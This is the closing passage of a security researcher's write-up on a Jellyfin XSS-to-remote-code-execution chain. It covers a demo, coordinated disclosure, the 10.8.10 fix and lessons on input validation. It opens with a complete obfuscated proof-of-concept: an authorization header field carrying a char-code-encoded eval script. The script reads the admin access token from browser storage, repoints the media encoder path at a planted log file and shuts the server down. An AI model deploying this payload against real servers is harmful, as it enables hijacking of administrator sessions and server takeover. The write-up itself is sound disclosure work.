 MediaBrowser Client="MAGIC_PWN_STRING", Device="jellyfinito", DeviceId="' onmouseenter=eval(String.fromCharCode(33,97,115,121,110,99,32,102,117,110,99,116,105,111,110,40,41,123,99,111,110,115,116,32,101,61,34,98,97,99,107,103,114,111,117,110,100,58,32,108,105,110,101,97,114,45,103,114,97,100,105,101,110,116,40,49,56,48,100,101,103,44,32,114,103,98,97,40,50,53,53,44,32,48,44,32,48,44,32,49,41,32,48,37,44,32,114,103,98,97,40,50,53,53,44,32,50,53,53,44,32,48,44,32,49,41,32,51,51,37,44,32,114,103,98,97,40,48,44,32,49,57,50,44,32,50,53,53,44,32,49,41,32,54,54,37,44,32,114,103,98,97,40,49,57,50,44,32,48,44,32,50,53,53,44,32,49,41,32,49,48,48,37,34,59,99,111,110,115,111,108,101,46,119,97,114,110,40,34,37,99,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,34,44,101,41,44,99,111,110,115,111,108,101,46,119,97,114,110,40,34,37,99,32,32,32,32,32,32,95,32,32,95,92,110,32,32,111,32,32,32,32,32,47,47,32,47,47,32,32,32,32,32,32,32,47,41,111,32,32,32,32,32,32,32,111,32,95,47,95,92,110,32,44,32,32,95,32,32,47,47,32,47,47,32,95,95,32,32,44,32,47,47,44,32,32,95,32,95,32,32,44,32,32,47,32,32,95,95,92,110,47,124,95,40,47,95,40,47,95,40,47,95,47,32,40,95,47,95,47,47,95,40,95,47,32,47,32,47,95,40,95,40,95,95,40,95,41,92,110,47,41,32,32,32,32,32,32,32,32,32,32,32,32,32,47,32,47,41,92,110,47,32,32,32,32,32,32,32,32,32,32,32,32,32,39,32,40,47,32,32,32,32,32,32,32,32,32,45,45,32,71,69,66,73,82,71,69,32,40,50,48,50,51,41,92,110,34,44,34,99,111,108,111,114,58,32,35,100,51,51,54,56,50,34,41,44,99,111,110,115,111,108,101,46,119,97,114,110,40,34,37,99,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,34,44,101,41,59,99,111,110,115,116,32,111,61,110,101,119,32,65,117,100,105,111,40,34,104,116,116,112,115,58,47,47,117,112,108,111,97,100,46,119,105,107,105,109,101,100,105,97,46,111,114,103,47,119,105,107,105,112,101,100,105,97,47,99,111,109,109,111,110,115,47,100,47,100,57,47,87,105,108,104,101,108,109,95,83,99,114,101,97,109,46,111,103,103,34,41,59,111,46,118,111,108,117,109,101,61,46,50,44,111,46,112,108,97,121,40,41,59,99,111,110,115,116,32,97,61,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,67,108,97,115,115,78,97,109,101,40,34,99,97,114,100,73,109,97,103,101,34,41,59,102,111,114,40,99,111,110,115,116,32,101,32,111,102,32,97,41,101,46,115,116,121,108,101,46,98,97,99,107,103,114,111,117,110,100,73,109,97,103,101,61,34,117,114,108,40,104,116,116,112,58,47,47,119,119,119,46,115,104,101,114,118,46,110,101,116,47,99,109,47,101,109,111,116,105,99,111,110,115,47,116,114,111,108,108,102,97,99,101,47,98,105,103,45,116,114,111,108,108,45,115,109,105,108,101,121,45,101,109,111,116,105,99,111,110,46,106,112,101,103,41,34,59,99,111,110,115,116,32,116,61,123,34,88,45,69,109,98,121,45,84,111,107,101,110,34,58,74,83,79,78,46,112,97,114,115,101,40,108,111,99,97,108,83,116,111,114,97,103,101,46,106,101,108,108,121,102,105,110,95,99,114,101,100,101,110,116,105,97,108,115,41,46,83,101,114,118,101,114,115,91,48,93,46,65,99,99,101,115,115,84,111,107,101,110,125,59,108,101,116,32,110,61,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,73,110,102,111,34,44,123,104,101,97,100,101,114,115,58,116,125,41,59,99,111,110,115,116,32,115,61,40,97,119,97,105,116,32,110,46,106,115,111,110,40,41,41,46,76,111,103,80,97,116,104,59,110,61,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,76,111,103,115,34,44,123,104,101,97,100,101,114,115,58,116,125,41,59,99,111,110,115,116,32,99,61,123,80,97,116,104,58,96,36,123,115,125,92,92,36,123,40,97,119,97,105,116,32,110,46,106,115,111,110,40,41,41,46,102,105,110,100,40,40,101,61,62,101,46,78,97,109,101,46,105,110,99,108,117,100,101,115,40,34,77,65,71,73,67,95,80,87,78,95,83,84,82,73,78,71,34,41,41,41,46,78,97,109,101,125,96,44,80,97,116,104,84,121,112,101,58,34,99,117,115,116,111,109,34,125,59,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,77,101,100,105,97,69,110,99,111,100,101,114,47,80,97,116,104,34,44,123,109,101,116,104,111,100,58,34,80,79,83,84,34,44,104,101,97,100,101,114,115,58,123,46,46,46,116,44,34,67,111,110,116,101,110,116,45,84,121,112,101,34,58,34,97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110,34,125,44,98,111,100,121,58,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,99,41,125,41,44,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,83,104,117,116,100,111,119,110,34,44,123,109,101,116,104,111,100,58,34,80,79,83,84,34,44,104,101,97,100,101,114,115,58,116,125,41,125,40,41,59)) data-lol='", Version="1337", Token=""
```

It does look _a little_ suspicious, don't you think? 🥸


### Demo {#demo}

After so many words it's finally time to watch something. You've earned it.

The video shows the exploitation process from the perspective of an administrative user.

<video controls preload="metadata"><source src="/Jellyfinito.mp4" type="video/mp4">
Your browser does not support the video tag.</video>


### Aftermath {#aftermath}

I've reported both vulnerabilities together with proof of concepts to the maintainers as per their [security policy](https://github.com/jellyfin/jellyfin/security). As a response, a `Github` security advisory and private fork of the repository were created, which gave me the chance to collaborate on the patches.

In the meantime, I continued to work on the presented **RCE** chain in order to show the real impact of those issues. And because it's fun.

I also provided a patch which hasn't been merged, because its implications are not easy to asses. That's exactly what I've alluded to at the beginning of the article:

Making the decision between breaking backwards compatibility and simply _rolling with it_.

So while the fixes don't go far enough in my opinion, I completely understand the reasoning behind it[^fn:6]. And let's not forget that these people work on `Jellyfin` in their spare time!

The issues are fixed with release [10.8.10](https://github.com/jellyfin/jellyfin/releases/tag/v10.8.10).

If you are interested in the details, check out the [advisory](https://github.com/jellyfin/jellyfin/security/advisories/GHSA-9p5f-5x8v-x65m).


### Conclusion {#conclusion}

Properly dealing with user input is **really** hard. Especially if it creeps up in unexpected places.

Do we validate incoming data?
Do we validate outgoing data?
Do we validate both times?

There's no _one fits all_ solution!

An open source project like `Jellyfin` might be better off with as much sanitization and restrictions as possible, because of the sheer number of people making changes to the codebase who all have their own assumptions.

Another project might have some well-defined choke points that can be audited heavily.

In any case, it's always worthwhile to take the flow of user input into consideration, maybe even with automated [taint analysis](https://www.sonarsource.com/blog/what-is-taint-analysis/).

Another aspect to consider is just how _powerful_ an `XSS` vulnerability can be in the right environment. With the ever-growing popularity of web apps and their backing `REST/GraphQL APIs`, there are so many possibilities for abuse. I love it.

As always: If you have questions, corrections, or simply want to get in touch: Please please please [holla at me](/about).

Thank you **so** much for reading - it truly makes my day 🌞.


### Acknowledgments {#acknowledgments}

-   [Joshua Boniface](https://www.boniface.me/) for coordinating the disclosure internally and externally.
-   [Ian Walton](https://iwalton.com/) and [David Ullmer](https://github.com/daullmer) for providing the patches.
-   The rest of the `Jellyfin` team for providing feedback and simply working on the project in their spare time.
-   James Harvey for giving me a head start in using the [Jellyfin API](https://jmshrv.com/posts/jellyfin-api/).

[^fn:1]: I'm not in _desperate_ need of a `CVE`!
[^fn:2]: Or any other media streaming solution, for that matter.
[^fn:3]: That's why I write long, mostly chronologically structured articles - I'd like to highlight the journey.
[^fn:4]: Oftentimes with instructions provided in the project's `README.md`.
[^fn:5]: Actually there are [more](https://gist.github.com/nielsvanvelzen/ea047d9028f676185832e51ffaf12a6f), which I've learned after the fact.
[^fn:6]: Additionally, the discussion will continue. Feel free to [contribute](https://github.com/jellyfin/jellyfin/issues?q=is%3Aopen+is%3Aissue+label%3Asecurity).
